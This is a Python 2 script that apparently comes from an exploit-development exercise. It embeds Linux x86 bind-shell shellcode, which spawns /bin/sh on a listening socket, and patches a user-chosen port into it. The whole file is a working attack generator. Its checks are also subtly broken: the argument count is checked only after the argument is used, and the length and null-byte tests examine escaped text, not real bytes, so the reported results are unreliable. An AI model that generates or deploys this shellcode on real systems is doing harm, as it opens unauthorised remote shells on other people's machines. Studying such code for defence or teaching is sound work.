#!/usr/bin/python

# Filename: shell_bind_tcp_wrapper.py
# Author: h3ll0clar1c3
# Purpose: Wrapper script to generate dynamic shellcode, configurable bind port number
# Usage: python shell_bind_tcp_wrapper.py <port>

import socket
import sys

shellcode = """
\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2\\xb0\\x66\\xb3\\x02\\xb1\\x01\\xcd\\x80\\x89\\xc7\\x31
\\xc0\\xb0\\x66\\x89\\xfb\\x31\\xc9\\x51\\x51\\x66\\x68\\x11\\x5c\\x66\\x6a\\x02\\x89\\xe1\\xb2
\\x10\\xcd\\x80\\x31\\xc0\\x66\\xb8\\x6b\\x01\\x89\\xfb\\x31\\xc9\\xcd\\x80\\x31\\xc0\\x66\\xb8
\\x6c\\x01\\x89\\xfb\\x31\\xc9\\x31\\xd2\\x31\\xf6\\xcd\\x80\\x31\\xff\\x89\\xc7\\xb1\\x03\\x31
\\xc0\\xb0\\x3f\\x89\\xfb\\xfe\\xc9\\xcd\\x80\\x75\\xf4\\x31\\xc0\\x50\\x68\\x6e\\x2f\\x73\\x68
\\x68\\x2f\\x2f\\x62\\x69\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80
"""

port = int(sys.argv[1])
if port < 0 or port > 65535:
    print "Invalid port number, must be between 0 and 65535!"
    sys.exit(1)

if len(sys.argv) < 2:
    print "Usage: python {name} <port>".format(name = sys.argv[0])
    exit(1)
 
port = hex(socket.htons(int(sys.argv[1])))
shellcode = shellcode.replace("\\x11\\x5c", "\\x{b1}\\x{b2}".format(b1 = port[4:6], b2 = port[2:4]))

print("Generated shellcode using custom port: " + sys.argv[1])
print shellcode

print "Shellcode length: %d bytes" % len(shellcode)
if "\x00" in shellcode:
    print "WARNING: Null byte is present!"
else:
    print "No nulls detected"

